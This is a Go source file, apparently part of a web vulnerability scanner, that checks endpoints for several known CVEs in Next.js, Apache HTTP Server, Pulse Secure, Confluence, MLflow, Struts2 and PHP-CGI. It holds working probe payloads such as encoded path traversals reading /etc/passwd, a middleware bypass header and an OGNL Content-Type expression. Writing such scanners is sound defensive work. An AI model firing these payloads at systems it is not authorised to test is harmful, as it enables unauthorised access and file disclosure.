package active

import (
	"context"
	"net/http"
	"net/url"
	"strings"
)

// KnownCVEs probes endpoints for high-impact, deterministic web CVEs where a
// specific mechanism and proof of impact identify the exact CVE:
//   - CVE-2025-29927: Next.js Middleware Authorization Bypass via x-middleware-subrequest
//   - CVE-2021-41773 / CVE-2021-42013: Apache HTTP Server 2.4.49/2.4.50 Path Traversal & File Read
//   - CVE-2012-1823: PHP-CGI Query-String Argument Injection (?-s source disclosure)
type KnownCVEs struct{}

// Name implements Module.
func (KnownCVEs) Name() string { return "known_cves" }

// Level implements Module.
func (KnownCVEs) Level() Level { return LevelEndpoint }

// Scan probes the endpoint for deterministic CVE-specific mechanisms.
func (KnownCVEs) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	if baseline == nil {
		return nil
	}
	var findings []Finding

	// 1. CVE-2025-29927 — Next.js Middleware Authorization Bypass
	// Triggered only when the baseline endpoint enforces access control (401/403).
	if baseline.StatusCode == http.StatusUnauthorized || baseline.StatusCode == http.StatusForbidden {
		mwHeaders := []string{
			"middleware:middleware:middleware:middleware:middleware",
			"src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
		}
		for _, hdrVal := range mwHeaders {
			if ctx.Err() != nil {
				return findings
			}
			extra := http.Header{"x-middleware-subrequest": {hdrVal}}
			resp, err := t.Do(ctx, http.MethodGet, p.URL, p.Values, false, extra)
			if err != nil || resp == nil {
				continue
			}
			if resp.StatusCode == http.StatusOK && len(strings.TrimSpace(resp.Body)) > 0 && resp.Body != baseline.Body {
				ev := strings.TrimSpace(resp.Body)
				if len(ev) > 220 {
					ev = ev[:220]
				}
				f, _ := NewFinding(Spec{
					Module:   "known_cves",
					CWE:      "CWE-287",
					CVE:      "CVE-2025-29927",
					CVEs:     []string{"CVE-2025-29927"},
					Title:    "CVE-2025-29927: Next.js middleware authorization bypass on " + p.URL,
					Claimed:  SeverityCritical,
					Tier:     TierVerified,
					Point:    p,
					Payload:  "x-middleware-subrequest: " + hdrVal,
					Evidence: ev,
					Description: "The protected endpoint returned HTTP " + baseline.Status + " without the header, " +
						"but answered HTTP 200 OK when sent 'x-middleware-subrequest: " + hdrVal + "' (CVE-2025-29927).",
					Remediation: "Upgrade Next.js to >= 15.2.3, >= 14.2.25, >= 13.5.9, or >= 12.3.5, and strip " +
						"external 'x-middleware-subrequest' headers at the reverse proxy / edge.",
				})
				findings = append(findings, f)
				break
			}
		}
	}

	// 2. CVE-2021-41773 / CVE-2021-42013 — Apache HTTP Server 2.4.49 / 2.4.50 Path Traversal
	if parsed, err := url.Parse(p.URL); err == nil && (parsed.Path == "" || parsed.Path == "/") {
		origin := parsed.Scheme + "://" + parsed.Host
		apachePayloads := []struct {
			path string
			cve  string
		}{
			{"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "CVE-2021-41773"},
			{"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd", "CVE-2021-42013"},
		}
		for _, ap := range apachePayloads {
			if ctx.Err() != nil {
				return findings
			}
			targetURL := origin + ap.path
			resp, err := t.Do(ctx, http.MethodGet, targetURL, nil, false, nil)
			if err != nil || resp == nil {
				continue
			}
			if Fresh(baseline, resp, "root:x:0:0:") {
				f, _ := NewFinding(Spec{
					Module:   "known_cves",
					CWE:      "CWE-22",
					CVE:      ap.cve,
					CVEs:     []string{"CVE-2021-41773", "CVE-2021-42013"},
					Title:    ap.cve + ": Apache HTTP Server path traversal on " + targetURL,
					Claimed:  SeverityCritical,
					Tier:     TierVerified,
					Point:    Point{URL: targetURL, Method: http.MethodGet},
					Payload:  ap.path,
					Evidence: Snippet(resp.Body, "root:x:0:0:", 220),
					Description: "The server resolved an encoded dot-segment traversal inside /cgi-bin/ and " +
						"returned /etc/passwd (" + ap.cve + ").",
					Remediation: "Upgrade Apache HTTP Server to >= 2.4.51 and ensure 'Require all denied' is " +
						"configured on the root directory.",
				})
				findings = append(findings, f)
				break
			}
		}

		// 2b. CVE-2019-11510 — Pulse Secure SSL VPN Arbitrary File Read
		pulsePath := "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
		if resp, err := t.Do(ctx, http.MethodGet, origin+pulsePath, nil, false, nil); err == nil && resp != nil {
			if Fresh(baseline, resp, "root:x:0:0:") {
				f, _ := NewFinding(Spec{
					Module:   "known_cves",
					CWE:      "CWE-22",
					CVE:      "CVE-2019-11510",
					CVEs:     []string{"CVE-2019-11510"},
					Title:    "CVE-2019-11510: Pulse Secure SSL VPN arbitrary file read on " + origin + pulsePath,
					Claimed:  SeverityCritical,
					Tier:     TierVerified,
					Point:    Point{URL: origin + pulsePath, Method: http.MethodGet},
					Payload:  pulsePath,
					Evidence: Snippet(resp.Body, "root:x:0:0:", 220),
					Description: "The target resolved the Pulse Secure /dana-na/ traversal path and returned /etc/passwd (CVE-2019-11510).",
					Remediation: "Apply Pulse Connect Secure advisory SA44101 patches.",
				})
				findings = append(findings, f)
			}
		}

		// 2c. CVE-2023-22515 — Atlassian Confluence Broken Access Control (/setup/setupadministrator.action)
		confluencePath := "/setup/setupadministrator.action"
		if resp, err := t.Do(ctx, http.MethodGet, origin+confluencePath, nil, false, nil); err == nil && resp != nil {
			if resp.StatusCode == http.StatusOK && FreshFold(baseline, resp, "setupadministrator") && containsAnyFold(resp.Body, []string{"confluence", "administrator"}) {
				f, _ := NewFinding(Spec{
					Module:   "known_cves",
					CWE:      "CWE-269",
					CVE:      "CVE-2023-22515",
					CVEs:     []string{"CVE-2023-22515"},
					Title:    "CVE-2023-22515: Atlassian Confluence unauthenticated setup access on " + origin + confluencePath,
					Claimed:  SeverityCritical,
					Tier:     TierVerified,
					Point:    Point{URL: origin + confluencePath, Method: http.MethodGet},
					Payload:  confluencePath,
					Evidence: Snippet(resp.Body, "setupadministrator", 220),
					Description: "The Confluence setup administrator endpoint is accessible without authentication (CVE-2023-22515).",
					Remediation: "Upgrade Confluence Data Center / Server to a patched release and block /setup/* externally.",
				})
				findings = append(findings, f)
			}
		}

		// 2d. CVE-2026-0545 — MLflow Job API Unauthenticated Access
		mlflowPath := "/ajax-api/3.0/jobs/"
		if resp, err := t.Do(ctx, http.MethodGet, origin+mlflowPath, nil, false, nil); err == nil && resp != nil {
			if resp.StatusCode == http.StatusOK && Fresh(baseline, resp, `"jobs"`) {
				f, _ := NewFinding(Spec{
					Module:   "known_cves",
					CWE:      "CWE-306",
					CVE:      "CVE-2026-0545",
					CVEs:     []string{"CVE-2026-0545"},
					Title:    "CVE-2026-0545: MLflow Job API unauthenticated access on " + origin + mlflowPath,
					Claimed:  SeverityCritical,
					Tier:     TierVerified,
					Point:    Point{URL: origin + mlflowPath, Method: http.MethodGet},
					Payload:  mlflowPath,
					Evidence: Snippet(resp.Body, `"jobs"`, 220),
					Description: "The MLflow /ajax-api/3.0/jobs/ endpoint responded HTTP 200 with job metadata without authentication (CVE-2026-0545).",
					Remediation: "Restrict access to /ajax-api/3.0/jobs/* behind authentication or upgrade MLflow.",
				})
				findings = append(findings, f)
			}
		}
	}

	// 2e. CVE-2017-5638 — Apache Struts2 Jakarta Multipart Parser Content-Type OGNL Injection
	if ctx.Err() == nil {
		ognlHeader := http.Header{"Content-Type": {"%{'rr_struts_'+(7*7)}"}}
		if resp, err := t.Do(ctx, http.MethodGet, p.URL, p.Values, false, ognlHeader); err == nil && resp != nil {
			if Fresh(baseline, resp, "rr_struts_49") {
				f, _ := NewFinding(Spec{
					Module:   "known_cves",
					CWE:      "CWE-94",
					CVE:      "CVE-2017-5638",
					CVEs:     []string{"CVE-2017-5638"},
					Title:    "CVE-2017-5638: Apache Struts2 Content-Type OGNL evaluation on " + p.URL,
					Claimed:  SeverityCritical,
					Tier:     TierVerified,
					Point:    p,
					Payload:  "Content-Type: %{'rr_struts_'+(7*7)}",
					Evidence: Snippet(resp.Body, "rr_struts_49", 220),
					Description: "The server evaluated an OGNL expression inside the Content-Type header and returned 'rr_struts_49' (CVE-2017-5638).",
					Remediation: "Upgrade Apache Struts to >= 2.3.32 or >= 2.5.10.1.",
				})
				findings = append(findings, f)
			}
		}
	}

	// 3. CVE-2012-1823 — PHP-CGI Argument Injection (?-s source disclosure)
	if strings.HasSuffix(strings.ToLower(p.URL), ".php") && ctx.Err() == nil {
		probeURL := p.URL + "?-s"
		if resp, err := t.Do(ctx, http.MethodGet, probeURL, nil, false, nil); err == nil && resp != nil {
			if resp.StatusCode == http.StatusOK && Fresh(baseline, resp, "<code><span style=") && strings.Contains(resp.Body, "&lt;?php") {
				f, _ := NewFinding(Spec{
					Module:   "known_cves",
					CWE:      "CWE-88",
					CVE:      "CVE-2012-1823",
					CVEs:     []string{"CVE-2012-1823"},
					Title:    "CVE-2012-1823: PHP-CGI query-string argument injection on " + p.URL,
					Claimed:  SeverityHigh,
					Tier:     TierVerified,
					Point:    Point{URL: probeURL, Method: http.MethodGet},
					Payload:  "?-s",
					Evidence: Snippet(resp.Body, "&lt;?php", 220),
					Description: "Passing '?-s' in the query string caused PHP-CGI to treat the query as a " +
						"command-line flag and return syntax-highlighted PHP source code (CVE-2012-1823).",
					Remediation: "Upgrade PHP or configure the web server to reject query strings starting with '-' when no '=' is present.",
				})
				findings = append(findings, f)
			}
		}
	}

	return findings
}
